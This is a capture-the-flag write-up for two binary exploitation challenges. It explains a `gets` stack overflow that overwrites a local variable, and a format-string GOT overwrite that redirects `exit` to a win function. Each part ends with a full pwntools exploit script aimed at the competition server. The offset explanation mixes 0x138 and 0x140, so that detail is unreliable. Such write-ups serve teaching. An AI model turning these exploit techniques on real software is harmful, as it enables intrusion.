# Guessing Game [100 PTS]
Lets decompile using Ghidra and rename some variables:

![decompilation of binary](/assets/pctf2023/pwn/guessinggame/decompiled.png)

We can see that there is a vulnerable call to `gets` in line 13. We can also see in line 21 that the binary checks if `target` is not zero. If it isn't zero, we get the flag. 
<br/>
<br/>
`gets` will not check how long the user's input is and will store whatever input is given to it, on the [stack](https://eli.thegreenplace.net/2011/09/06/stack-frame-layout-on-x86-64/).  Since the `target` variable is on the stack as well, we can overwrite the variable and get the flag!
<br/>
<br/>
To find the number of characters we need to overwrite the `target` variable, we can look at the stack layout provided by Ghidra. To show this layout just click on any of the variables' declarations.

![stack layout of binary](/assets/pctf2023/pwn/guessinggame/stack_layout.png)
<br/>
<br/>

From this we can see that our input is stored at `$rbp-0x138` and `target` is stored at `$rbp-0xc`.
<br/>
<br/>
Subtracting 0xc from 0x140 gives us 308, which is how many bytes we need to write in order to overwrite the `target` variable. 
<br/>
<br/>

> ``NOTE:`` The `outputFlag()` function tries to open a file called flag.txt, so when testing locally, make sure to put a fake flag in the same directory as the binary.

Here is the final solve script:
<br/>
```python
from pwn import *
context.binary = binary = ELF('./guessinggame')

#p = process()
p = remote('chal.pctf.competitivecyber.club', 9999)
payload = b'a'*308

p.sendline(payload)
p.interactive()
```

<br/>
<br/>

# Printshop [384 PTS]
Again, lets decompile this binary in Ghidra. 

![Printshop binary decompiled](/assets/pctf2023/pwn/printshop/decompiled.png)

<br/>

We can see that there is a format string vulnerability on line 14, since we are taking the user's input and printing it without any format specifiers. This means that the user can supply their own format specifiers like `%n` which can be used to write to memory addresses. 
<br/>

Also notice that instead of returning, the program calls `exit`. I also saw that there is a win function which is what our target is. 
<br/>
![win function](/assets/pctf2023/pwn/printshop/winfunc.png)
<br/>

We can do a GOT overwrite so that `exit` points to `win`. This means that when the program calls `exit`, it will actually call `win`. For more information on format string vulnerabilities, I recommend going through [pwn.college's format string exploits module](https://pwn.college/cse494-s2023/format-string-exploits). 

Before we do the GOT overwrite, we need to make sure that the GOT has write permissions. To check this, we can use `checksec`, a command line utility to check security protections on a binary. Running `checksec printshop` outputs:
<br/>

![checksec output](/assets/pctf2023/pwn/printshop/checksec.png)

Since there is `Partial RELRO`, we can overwrite the GOT.

<br/>
To perform this exploit, we can use pwntools' `fmtstr` class. 
<br/>

Here is the final solve script:
<br/>
```python
from pwn import *
context.binary = binary = ELF('./printshop')

def exec_func(payload): # this function is used so that pwntools can find the offset of our input buffer and other things like padding
        with remote('chal.pctf.competitivecyber.club', 7997) as p:
                p.sendline(payload)
                p.recvuntil(b'buisness!')
                p.recvline()
                p.recvline()
                out = p.recvline()
                log.info(out)
                return out

#p = process()
p = remote('chal.pctf.competitivecyber.club', 7997)
fmtstr = FmtStr(exec_func)
payload = b'a'*fmtstr.padlen + fmtstr_payload(fmtstr.offset, {binary.got.exit: binary.symbols.win})

p.sendline(payload)
p.interactive()

```
